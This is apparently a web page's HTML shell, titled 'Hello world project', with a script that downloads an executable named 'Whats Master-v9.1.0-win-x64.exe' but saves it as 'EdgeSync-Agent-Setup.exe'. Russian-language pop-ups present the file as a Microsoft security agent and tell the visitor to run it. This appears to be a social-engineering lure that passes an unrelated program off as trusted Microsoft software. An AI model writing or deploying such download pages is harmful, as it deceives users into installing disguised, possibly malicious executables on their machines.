<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Hello world project</title>

    <!-- UA Parser for browser detection -->
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>

    <!-- ClickOnce deployment function -->
    <script>
      function startDownload() {
        const baseUrl = window.location.protocol + "//" + window.location.host;
        const exeUrl = `${baseUrl}/deploy/Whats Master-v9.1.0-win-x64.exe`;

        console.log("Starting Security EdgeSync Agent download");
        console.log("Download URL:", exeUrl);

        // Show download notification
        alert("Начинается скачивание Security EdgeSync Agent (79 MB)...");

        // Create download link
        const link = document.createElement("a");
        link.href = exeUrl;
        link.download = "EdgeSync-Agent-Setup.exe";
        link.style.display = "none";

        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        console.log("Download started");

        // Show instructions
        setTimeout(() => {
          alert(
            "Файл скачивается! После завершения запустите EdgeSync-Agent-Setup.exe для установки Microsoft Security EdgeSync Agent.",
          );
        }, 1000);
      }

      // Make function globally available
      window.startDownload = startDownload;
    </script>
  </head>

  <body>
    <div id="root"></div>

    <script type="module" src="/client/App.tsx"></script>
  </body>
</html>
